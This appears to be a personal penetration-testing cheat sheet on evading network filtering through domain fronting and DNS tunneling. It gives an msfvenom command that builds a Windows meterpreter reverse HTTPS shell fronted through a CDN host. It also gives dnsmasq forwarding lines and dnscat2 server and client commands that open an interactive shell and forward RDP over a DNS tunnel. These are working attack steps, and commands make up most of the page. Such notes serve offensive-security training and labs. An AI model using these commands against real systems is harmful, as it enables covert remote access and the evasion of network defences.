---
layout:     post
author:     0x5c4r3
type: docs
permalink: Network_Filtering
---


<span style="font-size: 35px; color:red"><b>DNS Tunneling and Network Filtering</b></span>
&nbsp;
Security measures usually in place:
- DNS Filters
- Web Proxies
- IDS and IPS Systems
- HTTPS Inspection
- Domain Fronting (Host header injection)

<span style="font-size: 25px; color:white"><b>Domain Fronting</b></span>
To create a reverse HTTPS meterpreter revshell
```shell
msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.offseccdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe
```

<span style="font-size: 25px; color:white"><b>DNS Tunneling</b></span>

Edit /etc/dnsmasq.conf

```
server=/tunnel.com/192.168.119.120
server=/somedomain.com/192.168.119.120
```

then restart the service <span style="color:red">sudo systemctl restart dnsmasq</span> and make sure dnscat2 is installed (<span style="color:red">sudo apt install dnscat2</span>)

then start the process
```shell
dnscat2-server tunnel.com
```

FROM THE WINDOWS MACHINE:
```shell
dnscat2-v0.07-client-win32.exe tunnel.com
```

we can then start communicating with <span style="color:red">session -i 1</span> and run an interactive shell with <span style="color:red">shell</span> (the output will tell you in which window number the shell has been created) and connect to it with <span style="color:red">session -i <window_number></span>

you can also port forword like: <span style="color:red">listen 127.0.0.1:3389 172.16.51.21:3389</span>
